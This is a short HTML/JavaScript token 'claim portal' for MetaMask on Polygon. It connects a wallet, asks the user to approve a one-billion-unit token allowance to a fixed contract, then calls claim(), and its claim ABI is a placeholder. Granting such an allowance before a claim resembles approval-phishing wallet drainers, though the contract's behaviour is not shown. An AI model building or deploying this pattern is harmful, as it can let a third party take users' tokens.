<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>🚀 NWR3v2 Claim 🧩 (MetaMask Mobile)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <style>
    body { background:#111; color:#afa; font-family:sans-serif; text-align:center; padding:20px; }
    button { width:90%; max-width:300px; padding:14px; font-size:1rem; margin:10px auto; display:block;
             border:none; border-radius:6px; cursor:pointer; }
    #connect { background:#1E90FF; }
    #approve { background:#FFA500; }
    #claim   { background:#28a745; }
    #status  { margin-top:16px; font-size:1.1rem; }
  </style>
</head>
<body>
  <h1>🚀 NWR3v2 Claim Portal</h1>
  <button id="connect">Connect MetaMask</button>
  <button id="approve" disabled>⚙️ Approve Tokens</button>
  <button id="claim" disabled>💧 Claim Now</button>
  <div id="status"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
  <script>
    const CONTRACT_ADDR = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
    const TOKEN_ADDR    = "0xd6424f48214C2f7a63bcF7b29bD196698Bb463f9";
    const POLY_CHAIN_ID = 137;

    const TOKEN_ABI = [
      "function decimals() view returns(uint8)",
      "function approve(address,uint256) external returns(bool)"
    ];
    const CLAIM_ABI = [ /* your full ABI here */ ];

    const btnConnect = document.getElementById("connect");
    const btnApprove = document.getElementById("approve");
    const btnClaim   = document.getElementById("claim");
    const statusDiv  = document.getElementById("status");

    let provider, signer, contract;

    function logStatus(msg) {
      statusDiv.innerText = msg;
      console.log(msg);
    }

    btnConnect.onclick = async () => {
      if (!window.ethereum) return logStatus("👛 Please install MetaMask mobile");

      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        provider = new ethers.BrowserProvider(window.ethereum);
        const network = await provider.getNetwork();
        if (network.chainId !== POLY_CHAIN_ID) {
          return logStatus("⚠️ Please switch to Polygon mainnet in MetaMask");
        }
        signer = await provider.getSigner();
        contract = new ethers.Contract(CONTRACT_ADDR, CLAIM_ABI, signer);

        btnConnect.disabled = true;
        btnApprove.disabled = false;
        logStatus("✅ Connected to MetaMask");
      } catch (e) {
        console.error(e);
        logStatus("❌ MetaMask connection failed: " + (e.message || e));
      }
    };

    btnApprove.onclick = async () => {
      try {
        const token = new ethers.Contract(TOKEN_ADDR, TOKEN_ABI, signer);
        const decimals = await token.decimals();
        const amount = ethers.parseUnits("1000000000", decimals);

        logStatus("⏳ Approving...");
        const tx = await token.approve(CONTRACT_ADDR, amount);
        await tx.wait();

        logStatus("✅ Tokens Approved");
        btnApprove.disabled = true;
        btnClaim.disabled = false;
      } catch (e) {
        console.error(e);
        logStatus("❌ Approval failed: " + (e.message || e));
      }
    };

    btnClaim.onclick = async () => {
      try {
        logStatus("⏳ Claiming...");
        const tx = await contract.claim();
        await tx.wait();

        logStatus("🎉 Claim Succeeded");
        btnClaim.disabled = true;
      } catch (e) {
        console.error(e);
        logStatus("❌ Claim failed: " + (e?.data?.message || e.message || e));
      }
    };
  </script>
</body>
</html>
